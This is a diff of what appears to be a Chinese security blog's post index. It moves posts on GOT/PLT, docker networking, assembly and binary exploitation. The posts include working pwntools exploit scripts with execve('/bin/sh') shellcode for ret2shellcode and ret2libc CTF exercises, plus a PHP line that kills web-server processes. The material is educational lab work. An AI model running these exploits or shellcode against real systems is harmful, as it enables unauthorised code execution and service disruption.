-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@system(&quot;ps -aux | grep www-data | awk &apos;&#123;print $2&#125;&apos; | xargs kill -9&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2、条件竞争：</p>
-<p>不推荐，如果不死马中没有调用<code>usleep()</code>函数，进行延时的话，条件竞争是gg的。</p>
 ]]></content>
   </entry>
   <entry>
@@ -1153,20 +1143,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
-    <title>got表和plt表在程序执行过程中的作用</title>
-    <url>/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这是前面文章中的演示程序，这个指令为在Add函数里面调用的printf函数，那么为什么printf后面会跟着<code>plt</code>呢？</p>
-<p><img src="/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/1.png" alt></p>
-<h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>为提高CPU的利用效率，程序在编译的时候会采用两种表进行辅助，即<code>plt表和got表</code>。</p>
-<p>plt表为（Procedure Link Table），是程序链接表。而got表为（Global Offset Table），是一个存储外部库函数的表，全局偏移表。</p>
-<p>当程序在第一次运行的时候，会进入已被转载进内存中的动态链接库中查找对应的函数和地址，并把函数的地址放到got表中，将got表的地址数据映射为plt表的表项；<br>在程序二次运行的时候，就不用再重新查找函数地址，而是直接通过plt表找到got表中函数的地址，从而执行函数的功能了。</p>
-<p><img src="/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/2.png" alt></p>
-<h1 id="查看got表"><a href="#查看got表" class="headerlink" title="查看got表"></a>查看got表</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -R stack</span><br></pre></td></tr></table></figure>
-<p><img src="/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/3.png" alt></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://rj45mp.github.io/linux的plt表和got表在pwn中的利用">https://rj45mp.github.io/linux的plt表和got表在pwn中的利用</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>docker的容器间通信</title>
     <url>/docker%E7%9A%84%E5%AE%B9%E5%99%A8%E9%97%B4%E8%AE%BF%E9%97%AE/</url>
     <content><![CDATA[<p>每个人都是一座孤岛。</p>
@@ -1199,6 +1175,20 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># host1:</span><br><span class="line">docker run -itd  --name Test1 ubuntu /bin/bash</span><br><span class="line">weave attach 192.168.0.1/24 Test1</span><br><span class="line">weave connect Test2_host_ip</span><br><span class="line">docker attach Test1</span><br><span class="line"></span><br><span class="line"># host2:</span><br><span class="line">docker run -itd  --name Test2 ubuntu /bin/bash</span><br><span class="line">weave attach 192.168.0.2/24 Test2</span><br><span class="line">weave connect Test1_host_ip</span><br><span class="line">docker attach Test2</span><br><span class="line"></span><br><span class="line"># 安装软件</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install net-tools -y</span><br><span class="line">apt-get install iputils-ping -y</span><br></pre></td></tr></table></figure>
 <p>测试：<br><img src="/docker%E7%9A%84%E5%AE%B9%E5%99%A8%E9%97%B4%E8%AE%BF%E9%97%AE/9.png" alt></p>
 <p><img src="/docker%E7%9A%84%E5%AE%B9%E5%99%A8%E9%97%B4%E8%AE%BF%E9%97%AE/10.png" alt></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>got表和plt表在程序执行过程中的作用</title>
+    <url>/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这是前面文章中的演示程序，这个指令为在Add函数里面调用的printf函数，那么为什么printf后面会跟着<code>plt</code>呢？</p>
+<p><img src="/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/1.png" alt></p>
+<h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>为提高CPU的利用效率，程序在编译的时候会采用两种表进行辅助，即<code>plt表和got表</code>。</p>
+<p>plt表为（Procedure Link Table），是程序链接表。而got表为（Global Offset Table），是一个存储外部库函数的表，全局偏移表。</p>
+<p>当程序在第一次运行的时候，会进入已被转载进内存中的动态链接库中查找对应的函数和地址，并把函数的地址放到got表中，将got表的地址数据映射为plt表的表项；<br>在程序二次运行的时候，就不用再重新查找函数地址，而是直接通过plt表找到got表中函数的地址，从而执行函数的功能了。</p>
+<p><img src="/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/2.png" alt></p>
+<h1 id="查看got表"><a href="#查看got表" class="headerlink" title="查看got表"></a>查看got表</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -R stack</span><br></pre></td></tr></table></figure>
+<p><img src="/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8%E5%9C%A8%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/3.png" alt></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://rj45mp.github.io/linux的plt表和got表在pwn中的利用">https://rj45mp.github.io/linux的plt表和got表在pwn中的利用</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -2467,6 +2457,40 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
+    <title>ret2shellcode-习题</title>
+    <url>/ret2shellcode-test/</url>
+    <content><![CDATA[<h2 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h2><p><img src="/ret2shellcode-test/image-20191204084810779.png" alt="image-20191204084810779"></p>
+<p>64位的binary，开启Partial RELR0和PIE。</p>
+<h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE/ASLR"></a>PIE/ASLR</h2><p><strong>1、简介</strong></p>
+<p>PIE(position-independent executables)和ASLR(address space layout randomization),地址空间布局随机化。</p>
+<p><strong>2、原理</strong></p>
+<p>在程序运行加载时，程序和其库文件都会被映射到虚拟地址空间的不同地址，其对应的地址随着每一次执行程序的 变化而变化。<br>通过地址空间随机化机制，阻止黑客在堆栈上执行shellcode。</p>
+<p><strong>3、开关</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1)操作系统地址随机化： </span><br><span class="line">echo 0 /proc/sys/kernel/randomize_va_space  #关闭地址空间随机化保护机制 </span><br><span class="line">echo 1 /proc/sys/kernel/randomize_va_space  #将mmap基地址和stack与vdso页面随机化 </span><br><span class="line">echo 2 /proc/sys/kernel/randomize_va_space  #将mmap基地址、stack与vdso页面和栈地址随机化 </span><br><span class="line"></span><br><span class="line">2）程序地址随机化： </span><br><span class="line">gcc pie.c -o pie    #默认情况下，开启PIE保护机制 </span><br><span class="line">gcc-no-pie pie.c -o pie #关闭PIE保护机制 </span><br><span class="line">gcc -fpie -pie pie.c -o pie #开启低强度PIE保护机制 </span><br><span class="line">gcc -fPIE -pie pie.c -o pie #开启高强度PIE保护机制</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/ret2shellcode-test/image-20191204090018943.png" alt="image-20191204090018943"></p>
+<p>binary存在溢出，尽管其开启了PIE，可是泄露出来了buf的地址。</p>
+<p><img src="/ret2shellcode-test/image-20191204142028547.png" alt="image-20191204142028547"></p>
+<p>所以利用的思路就是ret2shellcode,往buf中填入shellcode，通过接受泄露出的buf地址，溢出劫持控制流去执行shellcode。</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><strong>1、选择</strong></p>
+<p>由于可填充的空间有限制，<code>0x40=64</code>，而pwntools中的shellcode长度在<code>44</code>,还得考虑填充buf的地址和垃圾数据问题，故选择一段23字节的64位shellcode</p>
+<p><img src="/ret2shellcode-test/image-20191204131232323.png" alt="image-20191204131232323"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、部署</strong></p>
+<p><img src="/ret2shellcode-test/image-20191204131457251.png" alt="image-20191204131457251"></p>
+<p>为避免shellcode填充进去后，在执行过程中被<code>leave</code>指令破坏，不能将shellcode填充到最前面。</p>
+<p>下面利用gdb进行动态调试解释：</p>
+<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p><img src="/ret2shellcode-test/image-20191204132050480.png" alt="image-20191204132050480"></p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p><img src="/ret2shellcode-test/image-20191204141725367.png" alt="image-20191204141725367"></p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x10+8</span><br><span class="line">p = process(&quot;./shellcode&quot;)</span><br><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">p.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = p.recvuntil(&apos;]&apos;, drop=True)</span><br><span class="line">buf_addr = int(buf_addr,16)</span><br><span class="line">payload = &apos;\x90&apos;*offset+p64(buf_addr+offset+8)+shellcode_x64</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ret2shellcode-test/image-20191204142604439.png" alt="image-20191204142604439"></p>
+<p>注意：shellcode_addr = buf_addr+offset+len(buf_addr)</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>github-ctf-wiki</p>
+]]></content>
+  </entry>
+  <entry>
     <title>小记python爬虫</title>
     <url>/python-crawler/</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这段时间，都在挖edusrc里面的学校漏洞。</p>
@@ -2519,40 +2543,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
-    <title>ret2shellcode-习题</title>
-    <url>/ret2shellcode-test/</url>
-    <content><![CDATA[<h2 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h2><p><img src="/ret2shellcode-test/image-20191204084810779.png" alt="image-20191204084810779"></p>
-<p>64位的binary，开启Partial RELR0和PIE。</p>
-<h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE/ASLR"></a>PIE/ASLR</h2><p><strong>1、简介</strong></p>
-<p>PIE(position-independent executables)和ASLR(address space layout randomization),地址空间布局随机化。</p>
-<p><strong>2、原理</strong></p>
-<p>在程序运行加载时，程序和其库文件都会被映射到虚拟地址空间的不同地址，其对应的地址随着每一次执行程序的 变化而变化。<br>通过地址空间随机化机制，阻止黑客在堆栈上执行shellcode。</p>
-<p><strong>3、开关</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1)操作系统地址随机化： </span><br><span class="line">echo 0 /proc/sys/kernel/randomize_va_space  #关闭地址空间随机化保护机制 </span><br><span class="line">echo 1 /proc/sys/kernel/randomize_va_space  #将mmap基地址和stack与vdso页面随机化 </span><br><span class="line">echo 2 /proc/sys/kernel/randomize_va_space  #将mmap基地址、stack与vdso页面和栈地址随机化 </span><br><span class="line"></span><br><span class="line">2）程序地址随机化： </span><br><span class="line">gcc pie.c -o pie    #默认情况下，开启PIE保护机制 </span><br><span class="line">gcc-no-pie pie.c -o pie #关闭PIE保护机制 </span><br><span class="line">gcc -fpie -pie pie.c -o pie #开启低强度PIE保护机制 </span><br><span class="line">gcc -fPIE -pie pie.c -o pie #开启高强度PIE保护机制</span><br></pre></td></tr></table></figure>
-
-<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/ret2shellcode-test/image-20191204090018943.png" alt="image-20191204090018943"></p>
-<p>binary存在溢出，尽管其开启了PIE，可是泄露出来了buf的地址。</p>
-<p><img src="/ret2shellcode-test/image-20191204142028547.png" alt="image-20191204142028547"></p>
-<p>所以利用的思路就是ret2shellcode,往buf中填入shellcode，通过接受泄露出的buf地址，溢出劫持控制流去执行shellcode。</p>
-<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><strong>1、选择</strong></p>
-<p>由于可填充的空间有限制，<code>0x40=64</code>，而pwntools中的shellcode长度在<code>44</code>,还得考虑填充buf的地址和垃圾数据问题，故选择一段23字节的64位shellcode</p>
-<p><img src="/ret2shellcode-test/image-20191204131232323.png" alt="image-20191204131232323"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2、部署</strong></p>
-<p><img src="/ret2shellcode-test/image-20191204131457251.png" alt="image-20191204131457251"></p>
-<p>为避免shellcode填充进去后，在执行过程中被<code>leave</code>指令破坏，不能将shellcode填充到最前面。</p>
-<p>下面利用gdb进行动态调试解释：</p>
-<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p><img src="/ret2shellcode-test/image-20191204132050480.png" alt="image-20191204132050480"></p>
-<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p><img src="/ret2shellcode-test/image-20191204141725367.png" alt="image-20191204141725367"></p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x10+8</span><br><span class="line">p = process(&quot;./shellcode&quot;)</span><br><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">p.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = p.recvuntil(&apos;]&apos;, drop=True)</span><br><span class="line">buf_addr = int(buf_addr,16)</span><br><span class="line">payload = &apos;\x90&apos;*offset+p64(buf_addr+offset+8)+shellcode_x64</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/ret2shellcode-test/image-20191204142604439.png" alt="image-20191204142604439"></p>
-<p>注意：shellcode_addr = buf_addr+offset+len(buf_addr)</p>
-<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>github-ctf-wiki</p>
-]]></content>
-  </entry>
-  <entry>
     <title>ret指令与call指令的深入理解</title>
     <url>/ret%E6%8C%87%E4%BB%A4%E4%B8%8Ecall%E6%8C%87%E4%BB%A4%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>1、代码<br><img src="/ret%E6%8C%87%E4%BB%A4%E4%B8%8Ecall%E6%8C%87%E4%BB%A4%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/1.png" alt><br>2、编译</p>
@@ -2592,6 +2582,63 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <h1 id="以ret和call实现的子程序源程序的框架"><a href="#以ret和call实现的子程序源程序的框架" class="headerlink" title="以ret和call实现的子程序源程序的框架"></a>以ret和call实现的子程序源程序的框架</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    main:   :</span><br><span class="line">            :</span><br><span class="line">            call sub1//调用子程序sub1</span><br><span class="line">            :</span><br><span class="line">            mov ax,4c00h</span><br><span class="line">            int 21h</span><br><span class="line">    sub1:   :</span><br><span class="line">            :</span><br><span class="line">            call sub2//调用子程序sub2</span><br><span class="line">            :</span><br><span class="line">            ret//子程序返回</span><br><span class="line">    sub2:   ://子程序sub2开始</span><br><span class="line">            :</span><br><span class="line">            ret//子程序返回</span><br><span class="line">code ends</span><br><span class="line">end main</span><br></pre></td></tr></table></figure>
 <p>解释：<br>一个写有一定功能的程序段叫子程序。<br>在子程序需要被执行的时候用call指令去调用。<br>当子程序执行完后，由于call指令后面的指令的地址已经存储在栈中(<code>push操作</code>)，<br>使得在子程序后面再使用ret指令时候，栈中的数据会设置IP内的值，<br>IP内的值的设置实现了CPU继续执行call指令后面的代码指令，达到程序继续执行的目的。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《汇编语言(第3版)》</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>stackoverflow之ret2libc-1</title>
+    <url>/stackoverflow%E4%B9%8Bret2libc-1/</url>
+    <content><![CDATA[<h2 id="binary3"><a href="#binary3" class="headerlink" title="binary3"></a>binary3</h2><p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191206201604050.png" alt="image-20191206201604050"></p>
+<p>32位binary，开启NX和Partial RELR0保护机制。</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191206201512893.png" alt="image-20191206201512893"></p>
+<p>没有<code>system</code>函数和字符串<code>/bin/sh</code>。</p>
+<p><strong>1、IDA</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191206202123258.png" alt="image-20191206202123258"></p>
+<p>binary中存在溢出点，溢出空间为112。</p>
+<p><strong>2、libc</strong></p>
+<p>libc是C语言库。而libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版。</p>
+<p>libc.so 中包含了大量的可以利用的函数，包括<code>system()、execve()</code>等系统级函数和字符串<code>/bin/sh</code>。</p>
+<p>既然binary中没有<code>system</code>函数和字符串<code>/bin/sh</code>，那么可以考虑将通过泄露出libc.so中<code>system和/bin/sh</code>的地址，然后劫持控制流执行<code>system(&#39;/bin/sh&#39;)</code>，即可达到getshell目的。</p>
+<p><strong>3、libc.so-version</strong></p>
+<p>如何泄露出libc.so中<code>system和/bin/sh</code>的地址？libc.so具有以下特性：</p>
+<ul>
+<li>libc.so 动态链接库中的函数之间相对偏移固定。</li>
+<li>每个函数的地址最低的12位并不会发生改变。(即便开启PIE)</li>
+</ul>
+<p>search libc.so：</p>
+<p> <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a> </p>
+<p> <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a> </p>
+<p>由此，可以通过泄露出某个函数地址，然后通过最低12位来确定libc.so的版本，进而确定<code>system和/bin/sh</code>的地址。</p>
+<p><strong>4、link-function-addr</strong></p>
+<p>如何泄露出libc.so中<code>system和/bin/sh</code>的地址？我们知道，libc延迟绑定机制会形成got表项，got表项中会含有已经执行过的函数的地址。</p>
+<p>所以我们可以通过劫持控制流到got表中特定的函数，泄露出其在内存中的地址，同时通过最低12位来确定libc.so的版本确定其在libc.so中的地址和<code>system和/bin/sh</code>的地址，最后计算出固定的相对偏移量，再计算出<code>system和/bin/sh</code>的真实地址。</p>
+<p><strong>5、pwn</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207030157529.png" alt="image-20191207030157529"></p>
+<p><strong>6、exploit</strong></p>
+<p>libc.so-version：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 112</span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">puts_plt_addr = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got_addr = elf.got[&apos;puts&apos;]</span><br><span class="line">main_plt_addr = elf.symbols[&apos;_start&apos;]//程序最初执行地址。</span><br><span class="line">payload = flat([&apos;\x90&apos;*offset,puts_plt_addr,main_plt_addr,puts_got_addr])</span><br><span class="line">p.sendlineafter(&apos;?&apos;,payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print hex(puts_addr)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207023018038.png" alt="image-20191207023018038"></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207023359675.png" alt="image-20191207023359675"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system_libc_addr = 	0x03ada0</span><br><span class="line">puts_libc_addr = 0x05fca0</span><br><span class="line">str_bin_sh = 0x15ba0b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 112</span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">puts_plt_addr = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got_addr = elf.got[&apos;puts&apos;]</span><br><span class="line">main_plt_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">payload = flat([&apos;\x90&apos;*offset,puts_plt_addr,main_plt_addr,puts_got_addr])</span><br><span class="line">p.sendlineafter(&apos;?&apos;,payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line"></span><br><span class="line">system_libc_addr = 0x03ada0</span><br><span class="line">puts_libc_addr = 0x05fca0</span><br><span class="line">str_bin_sh = 0x15ba0b</span><br><span class="line"></span><br><span class="line">libc_base_addr = puts_addr - puts_libc_addr</span><br><span class="line">system_addr = libc_base_addr + system_libc_addr</span><br><span class="line">binsh_addr = libc_base_addr + str_bin_sh</span><br><span class="line">payload1 = flat([&apos;\x90&apos;*offset,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207024743608.png" alt="image-20191207024743608"></p>
+<h2 id="train-cs-nctu-edu-tw-ret2libc"><a href="#train-cs-nctu-edu-tw-ret2libc" class="headerlink" title="train.cs.nctu.edu.tw: ret2libc"></a>train.cs.nctu.edu.tw: ret2libc</h2><p><strong>1、checksec</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207030438537.png" alt="image-20191207030438537"></p>
+<p>开启NX和Partial RELR0,同时泄露出<code>/bin/sh</code>和<code>puts</code>的地址。</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207031106045.png" alt="image-20191207031106045"></p>
+<p>binary中没有<code>system</code>的地址。</p>
+<p><strong>2、IDA</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207031213696.png" alt="image-20191207031213696"></p>
+<p>溢出空间=0x14+4+4+4=32。</p>
+<p><strong>3、pwn</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207032133227.png" alt="image-20191207032133227"></p>
+<p><strong>4、exploit</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">offset = 32</span><br><span class="line">p = process(&apos;./ret2libc&apos;)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">binsh_addr = int(p.recvuntil(&apos;\n&apos;),16)</span><br><span class="line">print hex(binsh_addr)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">puts_addr = int(p.recvuntil(&apos;\n&apos;),16)</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base_addr = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base_addr + libc.dump(&apos;system&apos;)</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;\x90&apos;*offset,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207033252435.png" alt="image-20191207033252435"></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>github-ctf-wiki</p>
 ]]></content>
   </entry>
   <entry>
@@ -2665,63 +2712,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <p>mysql权限机制参考：<br><a href="https://www.cnblogs.com/Csir/p/7889953.html" target="_blank" rel="noopener">https://www.cnblogs.com/Csir/p/7889953.html</a><br><a href="https://www.cnblogs.com/wangchaoyuana/p/7545419.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangchaoyuana/p/7545419.html</a></p>
 <p>mysql的information_schema表参考：<br><a href="https://blog.csdn.net/xianjie0318/article/details/80857568" target="_blank" rel="noopener">https://blog.csdn.net/xianjie0318/article/details/80857568</a></p>
 <p>mysql基础参考：<br><a href="https://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-tutorial.html</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>stackoverflow之ret2libc-1</title>
-    <url>/stackoverflow%E4%B9%8Bret2libc-1/</url>
-    <content><![CDATA[<h2 id="binary3"><a href="#binary3" class="headerlink" title="binary3"></a>binary3</h2><p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191206201604050.png" alt="image-20191206201604050"></p>
-<p>32位binary，开启NX和Partial RELR0保护机制。</p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191206201512893.png" alt="image-20191206201512893"></p>
-<p>没有<code>system</code>函数和字符串<code>/bin/sh</code>。</p>
-<p><strong>1、IDA</strong></p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191206202123258.png" alt="image-20191206202123258"></p>
-<p>binary中存在溢出点，溢出空间为112。</p>
-<p><strong>2、libc</strong></p>
-<p>libc是C语言库。而libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版。</p>
-<p>libc.so 中包含了大量的可以利用的函数，包括<code>system()、execve()</code>等系统级函数和字符串<code>/bin/sh</code>。</p>
-<p>既然binary中没有<code>system</code>函数和字符串<code>/bin/sh</code>，那么可以考虑将通过泄露出libc.so中<code>system和/bin/sh</code>的地址，然后劫持控制流执行<code>system(&#39;/bin/sh&#39;)</code>，即可达到getshell目的。</p>
-<p><strong>3、libc.so-version</strong></p>
-<p>如何泄露出libc.so中<code>system和/bin/sh</code>的地址？libc.so具有以下特性：</p>
-<ul>
-<li>libc.so 动态链接库中的函数之间相对偏移固定。</li>
-<li>每个函数的地址最低的12位并不会发生改变。(即便开启PIE)</li>
-</ul>
-<p>search libc.so：</p>
-<p> <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a> </p>
-<p> <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a> </p>
-<p>由此，可以通过泄露出某个函数地址，然后通过最低12位来确定libc.so的版本，进而确定<code>system和/bin/sh</code>的地址。</p>
-<p><strong>4、link-function-addr</strong></p>
-<p>如何泄露出libc.so中<code>system和/bin/sh</code>的地址？我们知道，libc延迟绑定机制会形成got表项，got表项中会含有已经执行过的函数的地址。</p>
-<p>所以我们可以通过劫持控制流到got表中特定的函数，泄露出其在内存中的地址，同时通过最低12位来确定libc.so的版本确定其在libc.so中的地址和<code>system和/bin/sh</code>的地址，最后计算出固定的相对偏移量，再计算出<code>system和/bin/sh</code>的真实地址。</p>
-<p><strong>5、pwn</strong></p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207030157529.png" alt="image-20191207030157529"></p>
-<p><strong>6、exploit</strong></p>
